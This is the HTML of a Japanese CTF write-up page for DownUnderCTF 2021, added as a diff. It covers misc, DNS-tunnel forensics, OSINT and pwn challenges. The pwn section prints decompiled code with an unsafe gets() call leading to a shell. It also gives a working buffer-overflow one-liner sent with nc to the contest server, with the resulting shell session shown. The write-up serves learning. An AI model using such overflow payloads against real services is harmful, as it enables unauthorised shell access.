+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s2">&#34;gzip compressed data&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;.gz&#34;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;mv &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;gunzip &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;touch &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s2">&#34;XZ compressed data&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;.xz&#34;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;mv &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;tar -J -xf &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;ls -l&#34;</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">fout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&#34;flag.txt</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;rm &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+<span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+SarCTFの復習をした時、<a href="https://st98.github.io/diary/posts/2020-02-17-sarctf.html">st98さんのブログ</a>を見てました。今回のやつもほぼ同じコードで解けるようです。こちらのやり方の方がスマートですね。</p>
+<p>今回はXZが出てくるので、その部分の追加は必要です。</p>
+<p>以下、追加分だけ。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="kn">import</span> <span class="nn">lzma</span>
+<span class="p">:</span>
+<span class="p">(</span><span class="n">snip</span><span class="p">)</span>
+<span class="p">:</span>
+  <span class="k">elif</span> <span class="n">s</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;XZ&#39;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="n">lzma</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;tmp.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">xz</span><span class="p">:</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">xz</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>DUCTF{babushkas_v0dka_was_h3r3}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-thats-not-my-name-100-points">[Forensics]: That&rsquo;s Not My Name (100 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>I think some of my data has been stolen, can you help me?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>notmyname.pcapng</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>タイトルからしてDNSが怪しいです。</p>
+<p>tsharkを使ってDNSクエリーを取り出してみると、どうもDNS tunnelを使った通信がありそうです。</p>
+<pre>
+$ tshark -r notmyname.pcapng -Y "dns" -T fields -e "dns.qry.name"
+</pre>
+<p><br />
+DNS tunnelではbase64が使われているので、<code>DUCTF{</code>をbase64でエンコードした<code>44554354467b</code>を使ってgrepしてみます。</p>
+<pre>
+$ tshark -r notmyname.pcapng -Y "dns" -T fields -e "dns.qry.name" | grep 44554354467b
+09fe012309643e95030000001c8003000344554354467b6334745f673037.5f793075725f6e346d337d.qawesrdtfgyhuj.xyz
+09fe012309643e95030000001c8003000344554354467b6334745f673037.5f793075725f6e346d337d.qawesrdtfgyhuj.xyz
+</pre>
+<p>あとは、base64でデコードするとフラグが得られます。</p>
+<p><br /></p>
+<p>Flag: <code>DUCTF{c4t_g07_y0ur_n4m3}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-deadcode-100-points">[Pwn]: deadcode (100 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>I&rsquo;m developing this new application in C, I&rsquo;ve setup some code for the new features but it&rsquo;s not (a)live yet.
+<br /><br />
+nc pwn-2021.duc.tf 31916</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>deadcode (ELF 64bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>単なるBOFのチャレンジですが、今回新たに分かったことがあったので記録しておきます。</p>
+<p>まずは、Ghidraにかけてコードを確認します。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">buffer_init</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">&#34;</span><span class="se">\n</span><span class="s">I</span><span class="se">\&#39;</span><span class="s">m developing this new application in C, I</span><span class="se">\&#39;</span><span class="s">ve setup some code for the new features but it</span><span class="se">\&#39;</span><span class="s">s not (a)live yet.&#34;</span>
+      <span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">What features would you like to see in my app?&#34;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0xdeadc0de</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n</span><span class="s">Maybe this code isn</span><span class="se">\&#39;</span><span class="s">t so dead...&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>ワンライナーで解こうと思って以下を実行しましたが、成功しませんでした。</p>
+<pre>
+(python -c 'print("A"*24+"\xde\xc0\xad\xde\x00\x00\x00\x00")' ; cat - ) | nc pwn-2021.duc.tf 31916
+</pre>
+<p><br />
+実はここのところ、ワンライナーで失敗することが多く、「pwntoolsで解けるからいいや」と思ってスルーしてたんですが、今回ちょっと調べてみました。</p>
+<p>hexdumpを使って調べてみると、全く期待していないデータが出ていることが判明。。。ちょっとびっくり。</p>
+<pre>
+$ (python -c 'print("A"*24+"\xde\xc0\xad\xde\x00\x00\x00\x00")' ; cat - ) | hexdump -C
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  41 41 41 41 41 41 41 41  c3 9e c3 80 c2 ad c3 9e  |AAAAAAAA........|
+</pre>
+<p><br />
+ググって調べたところ、これ Python3 だとこうなっちゃうらしいです。知らなかった&hellip; orz</p>
+<p><br />
+正解は以下。こっちは改行が自動で入らないので、自分で<code>b&quot;\n&quot;</code>を入れてます。</p>
+<pre>
+$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\xde\xc0\xad\xde\x00\x00\x00\x00"+b"\n")'; cat - ) | nc pwn-2021.duc.tf 31916
+
+I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.
+
+What features would you like to see in my app?
+
+
+Maybe this code isn't so dead...
+ls
+flag.txt
+pwn
+cat flag.txt
+DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
+</pre>
+<p><br /></p>
+<p>Flag: <code>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-get-over-it-100-points">[OSINT]: Get over it! (100 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Bridget loves bridges, this one is her favourite.
+<br /><br />
+What is the name of it and the length of its main span to the nearest metre?
+<br /><br />
+Flag format; DUCTF{the_bridge_name-1337m}</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>get-over-it.jpg</li>
+</ul>
+<img src="https://captureamerica.github.io/writeups/img/get-over-it.jpg" alt="get-over-it.jpg">
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>先日あった <a href="https://fans.sechack365.com/ctf/tsukuctf2021/">TsukuCTF</a> (少ししか参加してないのでブログは書いてません) で、OSINTには Google Lens というのが使えることを習ったので、Android Phoneを取り出して Google Lens アプリをインストールして使ってみました。</p>
+<p>見つかった橋の写真のいくつかのうち、オーストラリアのものを見てみると（DownUnder CTFがオーストラリアのCTFであるため）、エレナー・ショネル・ブリッジ (Eleanor Schonell Bridge)のようです。長さはググったらわかります。</p>
+<p><br /></p>
+<p>Flag: <code>DUCTF{Eleanor_Schonell_Bridge-185m}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-09-26
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/pbjar_ctf_2021/">
+            <span class="next-text nav-default">PBjar CTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
